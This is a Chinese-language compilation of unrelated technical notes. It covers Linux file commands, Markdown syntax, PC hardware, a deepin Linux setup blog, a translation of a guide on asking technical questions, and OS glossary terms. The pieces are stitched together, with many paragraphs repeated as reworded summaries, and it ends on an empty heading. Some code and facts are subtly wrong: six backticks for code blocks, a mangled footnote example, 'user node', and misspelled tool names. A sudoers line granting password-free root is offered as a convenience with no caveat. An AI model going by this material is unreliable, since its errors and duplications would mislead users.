lsattr命令查看文件扩展属性。语法为lsattr [options] [files]。选项-R用于递归查看子目录属性。

file命令显示文件类型。语法为file [option] [file]。可识别文本、二进制等文件类型，例如识别ASCII文本。

md5sum命令计算和校验文件的MD5值，用于数据完整性验证。语法为md5sum [option] [file]。选项-c用于校验MD5值。

chmod命令改变文件或目录权限，只有属主或root可执行。语法为chmod [option] [mode] [file]。模式可以是数字（如755）或字母（如u+w）。

标题：Markdown语法
Markdown中斜体、粗体、加粗斜体和删除线的代码格式如下：`*斜体*或_斜体_`、`**粗体**`、`***加粗斜体***`、`~~删除线~~`；对应的显示效果为*斜体*或_斜体_、**粗体**、***加粗斜体***、~~删除线~~。

Markdown分级标题的代码格式为：# 一级标题、## 二级标题、### 三级标题、#### 四级标题、##### 五级标题、###### 六级标题；语法规定正文需从二级标题开始编辑，一级标题按语法词条名占用。

Markdown超链接分两种形式：行内式和参考式，行内式使用较多。行内式语法为[链接文字](链接地址 “链接标题”)，()中“”内可加title属性（鼠标悬停显示），链接地址与title间有空格；示例代码为`欢迎来到[梵居闹市](http://blog.leanote.com/freewalk)`和`欢迎来到[梵居闹市](http://blog.leanote.com/freewalk "梵居闹市")`。

Markdown参考式超链接分两部分：文中写法为[链接文字][链接标记]，文本任意位置添加[链接标记]:链接地址 “链接标题”（地址与title间有空格）；若链接文字可作标记，可写为[链接文字][]和[链接文字]：链接地址。示例中[网站]:http://blog.leanote.com/freewalk 即为此类。

Markdown自动链接语法为用<>包裹网址或电子邮件信箱，Markdown会自动转成链接，示例代码为`<http://example.com/>`和`<address@example.com>`，显示效果为<http://example.com/>和<address@example.com>。

Markdown锚点是页内超链接，实现页面内跳转；Markdown Extra仅支持在标题后插锚点{#标记}，文档其他地方写[链接文字](#标记)跳转；Leanote编辑器右侧暂不支持锚点跳转，发布后支持。示例代码为`## 0. 目录{#index}`和`跳转到[目录](#index)`。

Markdown无序列表使用*、+、-表示，示例代码为`- 无序列表项 一`、`- 无序列表项 二`、`- 无序列表项 三`，显示效果为三个带“-”的列表项；有序列表用数字加英文句点表示，示例代码为`1. 有序列表项 一`等，显示效果对应数字列表项。

Markdown插入图像分两种写法：行内式和参考式。行内式语法为![图片Alt](图片地址 “图片Title”)，Alt是图片无法显示时的替代文字，Title是鼠标悬停文字；示例代码为`![美丽花儿](http://ww2.sinaimg.cn/large/56d258bdjw1eugeubg8ujj21kw16odn6.jpg "美丽花儿")`。

Markdown参考式插入图像：文档插入处写![图片Alt][标记]，文档最后写[标记]:图片地址 “Title”；示例代码为`![美丽花儿][flower]`和`[flower]:http://ww2.sinaimg.cn/large/56d258bdjw1eugeubg8ujj21kw16odn6.jpg  "美丽花儿"`，显示效果对应图片及标记。

Markdown注脚语法：需添加注脚的文字后加[^注脚名字]（加注），文本任意位置加[^注脚名字]:注脚说明，注脚间需空一行，转换后会自动归类到文末；示例中`使用 Markdown[^1]`的[^1]:Markdown是一种纯文本标记语言。

Markdown表格语法：第一行为表头，第二行分隔表头与主体，第三行起为表格行；列间用|隔开，原生方式每行两边也需|；第二行可指定对齐方向，默认为左对齐，-右边加:为右对齐；示例`产品|价格`和`-|-:`实现价格列右对齐。

Markdown插入代码分多种方式：行内式用`code`包裹单个单词或一句代码，示例`C语言里的函数 `scanf()` 怎么使用？`；缩进式多行代码需缩进4个空格或1个制表符，且前方必须有空行；还可用六个`包裹多行代码，示例为```包裹的C语言代码。

Markdown代码区块中，&、<和>会自动转成HTML实体，无需手动处理；示例中粘贴<div class="footer">© 2004 Foo Corporation</div>或<table>标签代码，Markdown会自动转换，直接显示HTML效果。

## 分级标题

```
# 一级标题 （按照语法词条名占用一级标题，正文请从二级标题开始编辑）
## 二级标题
### 三级标题
#### 四级标题
##### 五级标题
###### 六级标题
```

### 行内式

语法说明：

[]里写链接文字，()里写链接地址, ()中的”“中可以为链接指定title属性，title属性可加可不加。title属性的效果是鼠标悬停在链接上会出现指定的 title文字。[链接文字](链接地址 "链接标题")'这样的形式。链接地址与链接标题前有一个空格。
代码：

```
欢迎来到[梵居闹市](http://blog.leanote.com/freewalk)
欢迎来到[梵居闹市](http://blog.leanote.com/freewalk "梵居闹市")
```

### 参考式

参考式超链接一般用在学术论文上面，或者另一种情况，如果某一个链接在文章中多处使用，那么使用引用 的方式创建链接将非常好，它可以让你对链接进行统一的管理。
语法说明：

参考式链接分为两部分，文中的写法 [链接文字][链接标记]，在文本的任意位置添加[链接标记]:链接地址 "链接标题"，链接地址与链接标题前有一个空格。
如果链接文字本身可以做为链接标记，你也可以写成[链接文字][]
[链接文字]：链接地址的形式，见代码的最后一行。

## 锚点

网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。
注意：

1. Markdown Extra 只支持在标题后插入锚点，其它地方无效。
2. Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。
语法描述：

在你准备跳转到的指定标题后插入锚点{#标记}，然后在文档的其它地方写上连接到锚点的链接。
代码：

```
## 0. 目录{#index}
跳转到[目录](#index)
```

### 无序列表

使用 *，+，- 表示无序列表。
代码：

```
- 无序列表项 一
- 无序列表项 二
- 无序列表项 三
```

### 行内式

语法说明：![图片Alt](图片地址 "图片Title")
代码：

```
美丽花儿： 
![美丽花儿](http://ww2.sinaimg.cn/large/56d258bdjw1eugeubg8ujj21kw16odn6.jpg "美丽花儿")
```

## 注脚
语法说明：

在需要添加注脚的文字后加上脚注名字[^注脚名字],称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。
注意：经测试注脚与注脚之间必须空一行，不然会失效。成功后会发现，即使你没有把注脚写在文末，经Markdown转换后，也会自动归类到文章的最后。
代码：

```
使用 Markdown[1](@ref)可以效率的书写文档, 直接转换成 HTML[2](@ref), 你可以使用 Leanote[^Le] 编辑器进行书写。
[1](@ref):Markdown是一种纯文本标记语言
[2](@ref):HyperText Markup Language 超文本标记语言
[^Le]:开源笔记平台，支持Markdown和笔记直接发为博文
```

## 表格
语法说明：

不管是哪种方式，第一行为表头，第二行分隔表头和主体部分，第三行开始每一行为一个表格行。
列于列之间用管道符|隔开。原生方式的表格每一行的两边也要有管道符。
第二行还可以为不同的列指定对齐方向。默认为左对齐，在-右边加上:就右对齐。

### 行内式

插入行内代码，即插入一个单词或者一句代码的情况，使用`code`这样的形式插入。

标题：基础硬件
计算机（Computer）全称：电子计算机，俗称电脑，是一种能够按照程序运行，自动、高速处理海量数据的现代化智能电子设备。由硬件和软件所组成，没有安装任何软件的计算机称为裸机。

按照大小和移动性分类：- 台式电脑，也称桌面计算机、台式电脑和台式机- 工作站，高端的个人电脑，主要由单人操作并一般与局域网相连- 可移动计算机，与笔记型电脑相近- 笔记本电脑，小型、可以方便携带的个人电脑- 上网本，更为小型、售价较低的笔记本电脑- 超极本，比起一般的笔记型电脑，较薄、较轻、拥有较久的续航力- 平板电脑，笔记型电脑的衍生型，输入设备由鼠标和键盘变成了触控式屏幕- 个人数码助理，PDA，也称掌上电脑- 可穿戴式电脑，概念型产品，未具市场规模与趋势，美国VA公司曾于1999年主推过，但如今不再强调。注释:本文主要介绍台式电脑和笔记本电脑。

按照大小和移动性分类：台式电脑，也称桌面计算机、台式电脑和台式机；工作站，高端的个人电脑，主要由单人操作并一般与局域网相连；笔记本电脑，小型、可以方便携带的个人电脑。

现代个人电脑（台式）一般至少拥有以下的元件：1. 显示器2. 主板3. 处理器4. 内存5. 个人电脑接口6. 电源7. 光驱8. 硬盘9. 键盘10. 鼠标

现代个人电脑（台式）一般至少拥有：1. 显示器 2. 主板 3. 处理器 4. 内存 5. 个人电脑接口 6. 电源 7. 光驱 8. 硬盘 9. 键盘 10. 鼠标

在Linux系统中，每个设备都被当成一个文件来对待。举例来说，IDE接口的硬盘的文件名即为/dev/hd[a-d]，其中，括号内的字母为a-d当中的任意一个，也即有/dev/hda,/dev/hdb,/dev/hdc, 及/dev/hdd这四个文件的意思。

在Linux这个系统当中，几乎所有的硬件设备文件都在/dev这个目录内，所以你会看到/dev/hda,/dev/fd0等的文件名。那么打印机与软盘呢？分别是/dev/lp0,/dev/fd0。

Linux 的以太型网卡界面通常被称做 eth0、eth1 等等。环形卡亦同样地被看待，然而它们被称做 tr0、tr1等等。可以用ifconfig 命令来观看及修改网络界面状态。Linux的另一特点是网络界面并不会像其他设备一样地被看成是一个在/dev里头的文件。当一个以太网卡被侦测到时，它会被指定为第一个可用的接口卡名字，通常为eth0。

在Linux系统中，每个设备都被当成一个文件。IDE接口硬盘的文件名为/dev/hd[a-d]。所有硬件设备文件都在/dev目录内。打印机文件名是/dev/lp0，软盘文件名是/dev/fd0。

Linux的以太网卡界面称eth0、eth1。使用ifconfig命令可查看网络界面。网络界面不被视为/dev目录下的文件。新检测到的网卡通常命名为eth0。

标题：我的deepin变形记
接触和使用deepin也有多年的时间了。虚拟机，物理机，双系统都折腾过。重装系统N次，在N次重装过程中，发现自己折腾和配置deepin的路线大体一致，呈现出极强的个人主义色彩。虽然这个色彩跟我本人的使用习惯息息相关，但是其中一些操作，遇到的问题，也可能是其他人未曾或者也曾遇到过的。那就果断分享出来，给那些还在折腾的道路上不知所措的小伙伴们一点儿光芒，照亮他们入坑的道路。本篇主要分2部分：+ 小篇幅介绍系统下载安装+ 大篇幅介绍安装完系统以后的事情

deepin系统ISO下载，使用官方网站给出的各种下载途径即可：[点我直达](https://www.deepin.org/zh/download/)。截止到2021年11月30号，deepin当前可下载的最新版本是20.3版本。其他历史版本下载地址：+ [V20的历史版本](https://cdimage.deepin.com/releases/)+ [V20之前的历史版本](https://cdimage.deepin.com/releases-archive/)

系统安装方式包括：刻录启动盘【适合专业人士】，官方提供windows和Linux平台的刻录工具【深度启动盘制作工具】；使用第三方工具【适合小白人士】，推荐vetory（官方地址https://www.ventoy.net/cn/index.html）；虚拟机体验【适合体验人士】，windows平台建议用vmware workstation；双系统安装【适合更专业人士】，常见双硬盘安装，不建议双分区；其他方式（live版本、无盘安装等）作者未尝试。

系统安装注意事项：内核版本建议安装stable内核，适用于尝鲜或硬件新的用户；分区选择作者常用手动安装，分efi（默认大小）、boot（默认大小）、/（占剩余全盘）三个分区，不喜欢交换分区；可根据硬件配置和喜好选择是否集成nvidia驱动。

系统简单美化包含deepin桌面环境四大件：任务栏、启动器、控制中心、文件管理器。系统提供“时尚模式”和“高效模式”，可右键任务栏调整；任务栏插件可右键选择显示/隐藏并拖动；控制中心可配置个性化图像、启动sshd服务、设置电源策略（作者选“从不”）、修改主机名（需同步编辑/etc/hosts）。

作者卸载默认fcitx输入法，安装fcitx5的步骤：1. sudo apt purge *fcitx*；2. sudo apt update；3. sudo apt install fcitx5 fcitx5-pinyin；4. sudo vim /etc/environment添加GTK_IM_MODULE=fcitx、QT_IM_MODULE=fcitx、XMODIFIERS=@im=fcitx、SDL_IM_MODULE=fcitx。安装后需设置开机启动，配置输入法及快捷键。

系统瘦身包括：卸载原创应用（如深度浏览器、下载器等，可通过启动器右键或sudo apt purge卸载）；卸载多余内核（查看：sudo dpkg -l | egrep "linux-header|linux-image"，卸载：sudo apt purge 内核名）；清理系统日志（目录/var/log/或用jourctl工具）；使用系统清理工具。

第三方应用微信的安装方式：通过应用商店或命令行sudo apt install com.qq.weixin.deepin；坚果云在4K屏幕初次安装登陆界面显示不全，可外接1920x1080显示器或禁止缩放；网易云音乐4K屏幕缩放问题，修改/usr/share/applications/com.163.music.desktop的Exec字段为Exec=env QT_SCALE_FACTOR=2.25 /opt/apps/com.163.music/files/bin/netease-cloud-music %U（2.25为作者使用的缩放比例）。

系统提供了“时尚模式”和“高效模式”的选择。通过系统介绍视频，或者右键点击任务栏，均可选择调整。最下面放置各类图标的，叫做任务栏。鼠标右键任务栏，调整模式为“高效模式”。

任务栏右键时，插件提供了一些能够显示在任务栏上的插件模块。选择自己喜欢的，不显示自己不喜欢的插件。插件也可以进行拖动，隐藏起来或者显示出来。

安装完系统之后，【终端】执行命令 `df -h`可以看到系统安装完成，所占磁盘比例还是挺少的。但是deepin默认安装的一些应用，如果我们不喜欢，完全可以卸载。这里介绍如何卸载deepin原创应用来实现系统瘦身。

修改/etc/lightdm/deepin/xsettingsd.conf文件可以调整锁屏界面的字体。具体操作是先安装字体文件，然后编辑配置文件指定字体名称。

执行sudo visudo命令，编辑内容为：%sudo ALL=(ALL:ALL) NOPASSWD:ALL。然后将用户添加到sudo组，配置普通用户执行sudo时免密码验证。

标题：提问的智慧
在黑客世界里，当提出一个技术问题时，你能得到怎样的回答？这取决于挖出答案的难度，同样取决于你提问的方法。本指南旨在帮助你提高发问技巧，以获取你最想要的答案。首先你必须明白，黑客们只偏爱艰巨的任务，或者能激发他们思维的好问题。如若不然，我们还来干吗？如果你有值得我们反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼，可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，“问得好！”是发自内心的大力称赞。尽管黑客们有蔑视简单问题和不友善的坏名声，有时看起来似乎我们对新手，对知识贫乏者怀有敌意，但其实不是那样的。

我们不想掩饰对这样一些人的蔑视--他们不愿思考，或者在发问前不去完成他们应该做的事。这种人只会谋杀时间--他们只愿索取，从不付出，无端消耗我们的时间，而我们本可以把时间用在更有趣的问题或者更值得回答的人身上。我们称这样的人为“失败者”（由于历史原因，我们有时把它拼作“lusers”）。

我们在很大程度上属于志愿者，从繁忙的生活中抽出时间来解惑答疑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是抛弃那些看起来象失败者的家伙，以便更高效的利用时间来回答胜利者的问题。如果你觉得我们过于傲慢的态度让你不爽，让你委屈，不妨设身处地想想。我们并没有要求你向我们屈服--事实上，我们中的大多数人最喜欢公平交易不过了，只要你付出小小努力来满足最起码的要求，我们就会欢迎你加入到我们的文化中来。但让我们帮助那些不愿意帮助自己的人是没有意义的。如果你不能接受这种“歧视”，我们建议你花点钱找家商业公司签个技术支持协议得了，别向黑客乞求帮助。

在通过电邮、新闻组或者聊天室提出技术问题前，检查你有没有做到：1. 通读手册，试着自己找答案。2. 在FAQ里找答案（一份维护得好的FAQ可以包罗万象:）。3. 在网上搜索（个人推荐google~）。4. 向你身边精于此道的朋友打听。

当你提出问题的时候，首先要说明在此之前你干了些什么；这将有助于树立你的形象：你不是一个妄图不劳而获的乞讨者，不愿浪费别人的时间。能说明你从这些操作中学到了什么就更好了。如果提问者能从答案中学到东西，我们更乐于回答他的问题。周全的思考，准备好你的问题，草率的发问只能得到草率的回答，或者根本得不到任何答案。越表现出在寻求帮助前为解决问题付出的努力，你越能得到实质性的帮助。

小心选择提问的场合。如果象下面描述的那样，你很可能被忽略掉或者被看作失败者：1. 在风马牛不相及的论坛贴出你的问题2. 在探讨高级技巧的论坛张贴非常初级的问题；反之亦然3. 在太多的不同新闻组交叉张贴黑客们通常砍掉问错地方的问题，以保护自己的社区不被大量无关帖子淹没。你不会希望自己的帖子被这样砍掉吧。总的说来，问题发到精心挑选的公众论坛，比发到封闭的小圈子更容易得到有用的答案。

如果某项目有自己的开发邮件列表，要把问题发到这个邮件列表而不是某个开发者，即使你很清楚谁最能回答你的问题。仔细查看项目文档和项目主页，找到这个项目的邮件列表地址，这样做的理由有四：1. 任何值得问某位开发者的好问题，都值得向整个开发团体提出。反之，若你认为这个问题不值得在邮件列表中提起，就没有理由用它来骚扰任何一位开发者。2. 在邮件列表提问可以分担开发者的工作量。某位开发者（尤其当他是项目负责人的情况下），可能忙得没时间回答你的问题。3. 大多数邮件列表都有历史存档，而且都能在搜索引擎中检索到。人们可以从中找到你的问题和答案，不用一遍又一遍在列表中发问。4. 如果某个问题经常被提出，开发者可以据此改进文档或改进软件，以减少用户的困惑。而如果问题总在私下提出，就不会有人对此有整体上的把握了。

我们从经验中发现，粗心的写作者通常也是马虎的思考者（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。因此，明确充分表述你的问题非常重要。如果你嫌这样做麻烦，我们也会懒得搭理你。注意推敲你的用辞，不一定要用呆板正式的语言--事实上，黑客文化的价值观是不拘小节。准确的运用俚语和富有幽默感的语言，但别乱用；一定要能表明你在思考，在关注。

正确的拼写，标点符号和大小写很重要。别把“its”和“it's”或者“loose”和“lose”搞混淆了。别用全部大写的形式，这被视为粗鲁的大声叫嚷（全都用小写也好不到哪儿去，因为这会给阅读带来困难。Alan Cox可以用全部小写，但你不行）。更一般的说，如果你的提问写得象个半文盲，你很有可能被忽视。如果写得象一个窥客（破解爱好者）或者灰客（只会用现成工具的捣乱者）绝对是自己找死，保证你除了无情的抵制什么也得不到（或者，最好的结局是得到一大堆挖苦嘲笑的“帮助”）。

如果你在使用非母语的论坛提问，你可以犯点拼写和语法上的小错--但决不能在思考上马虎（没错，我们能弄清两者的分别）。另外，除非你确切知道你的回答者会使用什么语言，否则请用英文。匆匆忙忙的黑客往往简单的跳过他们看不懂的问题，而英文是网络上的工作语言。用英文可以降低你的问题未被阅读即遭抛弃的风险。

如果人为造成你的提问难以阅读和理解，将会更容易被人忽略。因此你要：1. 使用纯文本邮件，不要使用HTML（关掉HTML并不难）。2. 通常可以附加MIME附件，但一定要有真正的内容（例如附加的源文件或者补丁），而不仅仅是你的邮件客户端产生的文件模板（例如你邮件的一份拷贝）。3. 不要把所有问题放在不停换行的一整段中。（这将让答复的人难于回答其中一部分问题，即使能回答所有问题，我也更希望条理清楚的一个一个来:）。很可能收件人只能在80个字符宽度的文本显示器上读信，因此要相应的把行环绕模式设在80字符以内。

在邮件列表或者新闻组中，大约50字以内的主题标题是抓住资深专家注意力的黄金时机。别用喋喋不休的“帮帮忙”（更别说“救命啊！！！！！”这样让人反感的话）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，别用空格代替问题的描述，哪怕是极其简短的描述。

谨慎明确的描述症状。提供问题发生的环境（机器配置、操作系统、应用程序以及别的什么）。说明你在提问前是怎样去研究和理解这个问题的。说明你在提问前采取了什么步骤去解决它。罗列最近做过什么可能有影响的硬件、软件变更。尽量想象一个黑客会怎样反问你，在提问的时候预先给他答案。

你需要提供精确有效的信息。这并不是要求你简单的把成吨的出错代码或者数据完全转储摘录到你的提问中。如果你有庞大而复杂的测试条件，尽量把它剪裁得越小越好。这样做的用处至少有三点。第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；第二，简化问题使你得到有用答案的机会增加；第三，在提炼你的bug报告的过程中，也许你自己就能找出问题所在或作出更正。

告诉黑客们你认为问题是怎样引起的没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，不要加进你自己的理解和推论。让黑客们来诊断吧。

对找出问题最有帮助的线索，往往就是问题发生前的一系列操作，因此，你的说明应该包含操作步骤，以及电脑的反应，直到问题产生。在命令行操作的情况下，保存一个操作记录（例如使用脚本工具），并且引用相关的大约20条命令会大有帮助。如果崩溃的程序有诊断选项（例如用-v转到详尽模式），试着仔细考虑选择选项以在操作记录中增加有用的调试信息。

黑客们认为解决问题应该有公开、透明的流程。只要任何更有见地的人注意到答案的不完善或者不正确，这个最初的答案就可以和应该得到纠正。同时，通过能力和知识被大家注意，被大家接受，回答问题者得到了应有的奖励。如果你要求对方私下回答你，这既破坏了整个流程，也破坏了奖励制度。别提这要求，这是回答者的权利，由他来选择是否私下答复--如果他选择这样做，通常是因为他认为这个答案过于显而易见或者有不良的公开影响，别人不会感兴趣。

漫无边际的提问近乎无休无止的时间黑洞。最能给你有用答案的人也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞不太感冒，因此也可以说他们对漫无边际的提问不大感冒。如果你明确表述需要回答者做什么（提供建议，发送一段代码，检查你的补丁或是别的），就最有可能得到有用的答案。这会定出一个时间和精力的上限，便于回答者集中精力来帮你，这很凑效。

黑客们总是善于分辨哪些问题应该由你自己解决；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由你来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。

别用无意义的话结束提问，例如“有人能帮我吗？”或者“有答案吗？”。首先：如果你对问题的描述不很合适，这样问更是画蛇添足。其次：由于这样问是画蛇添足，黑客们会很厌烦你--而且通常会用逻辑上正确的回答来表示他们的蔑视，例如：“没错，有人能帮你”或者“不，没答案”。

彬彬有礼，多用“请”和“先道个谢了”。让大家都知道你对他们花费时间义务提供帮助心存感激。实话实说，虽然这不象合乎语法、清楚准确的描述，避免私有格式等等那么重要（也不能用来替代它们）；黑客一般更喜欢直接了当然而技术上敏锐的bug报告，而不是彬彬有礼的废话（如果这让你迷惑不解，请记住，我们衡量一个问题价值的标准是：它能让我们学会多少）。

问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个补充说明。补充说明不必很长或是很深入；简单的一句“你好，原来是网线出了问题！谢谢大家--Bill”比什么也不说要强。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇学术论文更好。

有一个古老而神圣的传统：如果你收到“RTFM （Read The Fucking Manual）”的回复，回答者认为你应该去读TMD手册。当然，基本上他是对的，你应该读一读。RTFM有一个年轻的亲戚。如果答案是“STFW （Search The Fucking Web）”，回答者认为你应该到TMD的网上去搜索。基本上，他也是对的，你就去找吧。

如果你不是很理解答案，别立刻要求对方解释。象你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），去理解它。如果你真的需要对方解释，记得表现出你已经学到了点什么。

黑客圈子里很多貌似粗鲁的言行并非有意冒犯。更恰当的说，这是直率、不说废话的沟通方式的产物，这种沟通方式源于人们关注问题的解决--多过让人感受温暖亲情然而却依旧糊里糊涂--的天性。

如果你觉得受到粗鲁的对待，请保持冷静。如果真有人表现粗野，通常会有列表/新闻组/论坛的长辈找他谈心，如果没有这样，而你又大发脾气，则很可能对方的言行是黑客社区行为规范许可内，而你被认为是有过错的。这会不利于你得到信息或者帮助。

很有可能，你在黑客社区的论坛会受到很多公开的攻击--用本文提到的各种方式或类似的方法，而且很可能会有各式各样的旁敲侧击来告诉你你有多讨厌。如果噩梦成真，你能做的最糟的事就是为此发牢骚，抱怨受到人身攻击，要求对方道歉，尖叫，屏住呼吸，威胁要控诉对方，向他老板告状，不掀起马桶座圈，等等等等。然而，你应该这样：由它去吧，这没什么大不了的。实际上这么做是恰当的和有益的（主要是有利身心健康:）。

以下是几个经典蠢问题，以及黑客在拒绝回答时的心中所想：问题：我能在哪找到X程序？问题：我的程序/配置/SQL申明没有用问题：我的Windows有问题，你能帮我吗？问题：我在安装Linux（或者X）时有问题，你能帮我吗？问题：我怎么才能破解root帐号/窃取OP特权/读别人的邮件呢？

最后，我举一些例子来说明，怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。蠢问题：我可以在哪儿找到关于Foonly Flurbamatic的资料？聪明问题：我用Google搜索过“Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？

如果仍得不到答案，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。总的说来，简单的重复张贴问题是个很糟的想法。这将被视为无意义的喧闹。

在通过电邮、新闻组或者聊天室提出技术问题前，检查你有没有做到：1. 通读手册，试着自己找答案。2. 在FAQ里找答案（一份维护得好的FAQ可以包罗万象:）。3. 在网上搜索（个人推荐google~）。4. 向你身边精于此道的朋友打听。当你提出问题的时候，首先要说明在此之前你干了些什么；这将有助于树立你的形象：你不是一个妄图不劳而获的乞讨者，不愿浪费别人的时间。能说明你从这些操作中学到了什么就更好了。

小心选择提问的场合。如果象下面描述的那样，你很可能被忽略掉或者被看作失败者：1. 在风马牛不相及的论坛贴出你的问题2. 在探讨高级技巧的论坛张贴非常初级的问题；反之亦然3. 在太多的不同新闻组交叉张贴黑客们通常砍掉问错地方的问题，以保护自己的社区不被大量无关帖子淹没。你不会希望自己的帖子被这样砍掉吧。总的说来，问题发到精心挑选的公众论坛，比发到封闭的小圈子更容易得到有用的答案。

准确的运用俚语和富有幽默感的语言，但别乱用；一定要能表明你在思考，在关注。正确的拼写，标点符号和大小写很重要。别把“its”和“it's”或者“loose”和“lose”搞混淆了。别用全部大写的形式，这被视为粗鲁的大声叫嚷（全都用小写也好不到哪儿去，因为这会给阅读带来困难。Alan Cox可以用全部小写，但你不行）。更一般的说，如果你的提问写得象个半文盲，你很有可能被忽视。

在邮件列表或者新闻组中，大约50字以内的主题标题是抓住资深专家注意力的黄金时机。别用喋喋不休的“帮帮忙”（更别说“救命啊！！！！！”这样让人反感的话）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，别用空格代替问题的描述，哪怕是极其简短的描述。如果你在回复中提出问题，记得要修改内容标题，表明里面有一个问题。一个看起来象“Re：测试”或者“Re：新bug”的问题很难引起足够重视。

标题：系统相关的基本概念
操作系统（Operating System，OS）：是管理计算机硬件与软件资源的系统软件，同时也是计算机系统的内核与基石。操作系统需要处理管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。

操作系统（Operating System，OS）：是管理计算机硬件与软件资源的系统软件，同时也是计算机系统的内核与基石。操作系统需要处理管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。

shell：它是一个程序，可从键盘获取命令并将其提供给操作系统以执行。在过去，它是类似 Unix 的系统上唯一可用的用户界面。

shell：它是一个程序，可从键盘获取命令并将其提供给操作系统以执行。在过去，它是类似 Unix 的系统上唯一可用的用户界面。如今，除了命令行界面（CLI）外，还具有图形用户界面（GUI）。

GUI (Graphical User Interface)：是一种用户界面，允许用户通过图形图标和音频指示符与电子设备进行交互。

内核模式（kernel mode）: 通常也被称为超级模式（supervisor mode），在内核模式下，正在执行的代码具有对底层硬件的完整且不受限制的访问。它可以执行任何CPU指令并引用任何内存地址。

内核模式（kernel mode）: 通常也被称为超级模式（supervisor mode），在内核模式下，正在执行的代码具有对底层硬件的完整且不受限制的访问。用户模式（user node）：当操作系统运行用户应用程序时，系统处于用户模式；用户模式下，模式位设置为1。

用户模式（user node）：当操作系统运行用户应用程序时，系统处于用户模式。当应用程序请求操作系统的帮助或发生中断或系统调用时，就会发生从用户模式到内核模式的转换。

计算机架构(computer architecture)：在计算机工程中，是描述计算机系统功能、组织和实现的一组规则和方法，主要包括指令集、内存管理、I/O 和总线结构。

SATA(Serial ATA)：串行 ATA (Serial Advanced Technology Attachment)，是一种电脑总线，负责主板和大容量存储设备（如硬盘及光盘驱动器）之间的数据传输，主要用于个人电脑。

批处理(batch system): 批处理操作系统的用户不直接与计算机交互，用户在打孔卡等脱机设备上准备工作并提交给操作员；具有类似需求的作业会被一起批处理并成组运行。

OS/360：正式称为IBM System / 360操作系统，是IBM为1964年发布的System/360大型机开发的已停产的批处理操作系统。

多处理系统(Computer multitasking)：是指计算机同时运行多个程序的能力，一般方法是运行程序代码段、保存工作环境，循环执行该过程。

云计算(cloud computing)：是计算机系统资源（尤其是数据存储和计算能力）的按需可用性，无需用户直接主动管理；大型云通常从中央服务器分布在多个位置，近用户的连接点可指定为边缘服务器。

UNIX 操作系统：是强大的多用户、多任务操作系统，支持多种处理器架构，属于分时操作系统。POSIX：是IEEE为在各种UNIX操作系统上运行软件而定义API的一系列互相关联的标准的总称。

Linux：是大名鼎鼎的操作系统，原文描述为“太强大了，不予以解释了，大家都懂”。MS-DOS(MicroSoft Disk Operating System)：是微软公司发展的操作系统，运行在Intel x86个人电脑上，是DOS家族中最著名的一个。

RAM(Random Access Memory)：随机存取存储器，也叫主存，是与CPU直接交换数据的内部存储器，特点是可随时读写、速度快，断电后数据丢失；ROM (Read Only Memory)：只读存储器，存储数据无法改变或删除，断电后内容不消失。

系统调用(system call): 指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务，提供用户程序与操作系统之间的接口，如设备IO操作或进程间通信需在内核态运行。

中断(Interrupt)：接收到外围硬件异步信号或软件同步信号后，处理器进行相应处理；硬件中断会保存CPU执行状态，软件中断是CPU指令集中的指令，导向中断处理代码。中断向量(interrupt vector)：位于中断向量表中，是中断处理程序的地址。

DMA (Direct Memory Access)：直接内存访问，允许电脑内部硬件子系统（如外设）独立直接读写系统内存，无需CPU介入处理。总线(Bus)：是计算机组件间规范化的交换数据的方式，提供数据传送和控制逻辑。

硬实时系统(hard real-time system)：必须绝对在每个截止日期前完成任务，如核系统、起搏器、航空电子设备；软实时系统(soft real-time system)：可能错过某些截止日期，错过过多会导致性能下降，如计算机声音系统。

进程(Process)：程序的真正运行实例，程序是指令、数据及组织形式的描述；一个程序可关联多个进程，进程可同步或异步独立运行。进程表(process table)：操作系统维护的数据结构，条目包含进程名称、状态、优先级、寄存器等信息。

根目录(root directory)：指计算机系统中的顶层目录，如Windows中的C盘和D盘，Linux中的/。工作目录(Working directory)：用户在操作系统内所在的目录，用户可在此目录用相对文件名访问文件。

客户端(clients)：访问服务器提供的服务的计算机硬件或软件。服务端(servers)：为其他程序或设备提供功能的计算机程序或设备；主从架构(client-server)：区分客户端与服务器，客户端向服务器发出请求，如文件服务器、游戏服务器。

Java 虚拟机(Java virtual Machines)：有自己的硬件架构（如处理器、堆栈、寄存器）和指令系统；屏蔽与具体操作系统平台相关的信息，Java程序生成字节码即可在多平台运行。

标题：输入设备
输入设备是计算机IO系统中的input设备，用于向计算机传递信息及指令。如键盘，鼠标，麦克风，摄像头等设备都是常见的输入设备，它们在人机交互上起到了重要的作用。

标题：cat查看文件内容
